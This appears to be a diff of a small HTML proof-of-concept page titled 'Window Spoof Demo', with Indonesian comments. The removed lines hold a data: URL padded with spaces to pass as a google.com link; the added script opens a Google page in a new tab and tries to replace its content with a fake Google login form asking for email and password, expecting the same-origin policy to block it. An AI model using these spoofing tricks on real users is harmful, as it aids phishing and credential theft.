@@ -1,8 +1,39 @@
 <!DOCTYPE html>
 <html>
+  <head>
+    <meta charset="UTF-8">
+    <title>Window Spoof Demo</title>
+  </head>
   <body>
-      <h1>
-    <a href="data:                                                                      thisisaveryveryveryveryveryveryveryveryverylongstring.google.com/,trust me">Long press to preview Google</a>
-</h1>
+    <button onclick="spoof()">Click to Spoof</button>
+
+    <script>
+      function spoof() {
+        // Buka jendela baru ke situs target
+        let w = window.open("https://www.google.com/csi", "_blank");
+
+        // Pastikan tab berhasil dibuka
+        if (!w) {
+          alert("Pop-up diblokir. Izinkan pop-up untuk demo ini.");
+          return;
+        }
+
+        // Tunggu sebentar sebelum ganti konten
+        setTimeout(() => {
+          try {
+            w.stop(); // hentikan loading
+            w.document.body.innerHTML = `
+              <h1>Login Google</h1>
+              <p>Masukkan email dan password Anda untuk melanjutkan.</p>
+              <input type="text" placeholder="Email"><br><br>
+              <input type="password" placeholder="Password"><br><br>
+              <button>Login</button>
+            `;
+          } catch (e) {
+            alert("Tidak bisa memodifikasi tab karena kebijakan browser (Same-Origin Policy).");
+          }
+        }, 2000);
+      }
+    </script>
   </body>
 </html>
